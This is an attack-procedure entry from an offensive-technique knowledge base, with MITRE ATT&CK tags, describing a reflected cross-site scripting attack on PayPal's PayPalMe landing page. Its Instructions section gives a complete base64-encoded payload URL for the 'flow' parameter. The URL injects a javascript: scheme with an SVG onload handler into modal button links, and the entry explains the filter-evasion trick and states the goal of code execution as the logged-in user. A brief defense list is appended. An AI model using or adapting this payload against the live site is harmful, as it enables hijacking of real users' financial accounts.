---
id: proc-paypalme-xss-chrome-firefox-navigate
tags:
  - xss
  - payload-crafting
  - web-exploit
type: procedure
tools:
  - '[[tools/Chrome]]'
  - '[[tools/Firefox]]'
tactics:
  - '[[Initial Access]]'
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Exploit Public-Facing Application]]'
updated_at: '2025-12-13T23:55:38.032Z'
skill_level: intermediate
impact_level: medium
detection_risk: low
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Initial Access]]'
mitre_techniques:
  - '[[Exploit Public-Facing Application]]'
---
# Craft-and-Navigate-to-XSS-Payload-URL-on-Chrome-or-Firefox

## Summary

This procedure crafts a base64-encoded URL payload for the 'flow' parameter on the PayPalMe landing page and navigates to it using Chrome or Firefox, setting up the reflected XSS injection into modal button hrefs for subsequent execution.

## Description

The vulnerability stems from insufficient validation of the base64-decoded 'flow' parameter, which populates returnUrl and cancelUrl in modal hrefs. By encoding a javascript: scheme prefixed with 'javascripT:PAYPAL.com=' and using hex-encoded SVG onload events, the payload bypasses restrictions and injects executable code. This step prepares the environment for user-triggered execution, targeting the www.paypal.com/paypalme/my/landing endpoint. Expected outcome is the modal rendering with tainted hrefs, leading to JavaScript execution in the site's context upon interaction.

## Requirements

1. Chrome or Firefox browser installed and updated.
2. Network access to www.paypal.com (no authentication required for landing page).
3. Basic knowledge of URL encoding and base64 for payload construction.

## Defense

Defensive measures and detection strategies:

- Implement strict URL scheme whitelisting (e.g., block javascript:).
- Sanitize and validate base64-decoded inputs before use in HTML attributes.
- Use Content Security Policy (CSP) to restrict inline JavaScript execution.
- Monitor for anomalous href patterns in web traffic logs.

## Objectives

1. Deliver the XSS payload to the vulnerable parameter without triggering sanitization.
2. Load the landing page modal with injected hrefs.
3. Position for arbitrary code execution as the authenticated user.

## Instructions

### Step 1: Construct the Payload URL

**Context**: Encode the payload to inject javascript: into returnUrl and cancelUrl, using SVG onload for evasion.

No command execution; manually construct the URL in the browser address bar or via a script.

The full URL: `https://www.paypal.com/paypalme/my/landing?flow=cmV0dXJuVXJsPWphdmFzY3JpcFQ6UEFZUEFMLmNvbSUzZDEsbG9jYXRpb24lM2QmamF2YXNjcmlwdDpceDNjc3ZnXHgyMG9ubG9hZD1hbGVydFx4Mjhkb2N1bWVudC5kb21haW5ceDI5XHgzZScmY2FuY2VsVXJsPWphdmFzY3JpcFQ6UEFZUEFMLmNvbSUzZDEsbG9jYXRpb24lM2QmamF2YXNjcmlwdDpceDNjc3ZnXHgyMG9ubG9hZD1hbGVydFx4Mjhkb2N1bWVudC5kb21haW5ceDI5XHgzZSc=`

> This decodes to returnUrl=javascript:PAYPAL.com%3D1,location%3Djavascript:%3Csvg%20onload=alert%28document.domain%29%3E&cancelUrl=... (similar).

### Step 2: Navigate in Browser

**Context**: Visit the URL to trigger the reflection and modal display.

Open Chrome or Firefox and paste the URL into the address bar, then press Enter.

**Expected Output**: PayPalMe landing page loads, modal appears with buttons containing the injected hrefs.

## MITRE ATT&CK Mapping

### Tactics

- [[Initial Access]]

### Techniques

- [[Exploit Public-Facing Application]]

### Sub-Techniques


## Commands Used


## Tools Used

- [[tools/Chrome]]
- [[tools/Firefox]]

## Tags

- [[xss]]
- [[payload-crafting]]
